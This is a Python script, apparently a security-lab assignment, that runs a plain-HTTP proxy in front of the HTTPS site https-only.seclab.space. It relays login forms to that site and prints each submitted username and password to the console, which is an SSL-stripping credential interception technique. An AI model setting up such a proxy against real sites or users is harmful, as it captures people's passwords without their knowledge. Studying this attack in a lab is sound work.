#Base code obtained from: http://www.codexpedia.com/python/python-web-server-for-get-and-post-requests/
#Additional code has been added in do_POST and do_get for the assignment

from http.server import BaseHTTPRequestHandler, HTTPServer
import cgi, http, urllib

class GP(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_headers()

        conn = http.client.HTTPSConnection("https-only.seclab.space")
        conn.request("GET", "")
        response = conn.getresponse()
        data = response.read()

        conn.close()

        print (response.status, response.reason)
        print(data)
        self.wfile.write(data)


    def do_POST(self):
        self._set_headers()
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD': 'POST'}
        )
        username = form.getvalue("username")
        password = form.getvalue("password")

        params = urllib.parse.urlencode({'username': username, 'password': password, 'action': 'show'})
        headers = {"Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain"}
        conn = http.client.HTTPSConnection("https-only.seclab.space")
        conn.request("POST", "", params, headers)
        response = conn.getresponse()
        data = response.read()

        conn.close()

        print (response.status, response.reason)
        print (data)
        print ("username = " + form.getvalue("username")+", password = " + form.getvalue("password"))
        self.wfile.write(data)

def run(server_class=HTTPServer, handler_class=GP, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print ('Server running at localhost:8080...')
    httpd.serve_forever()

run()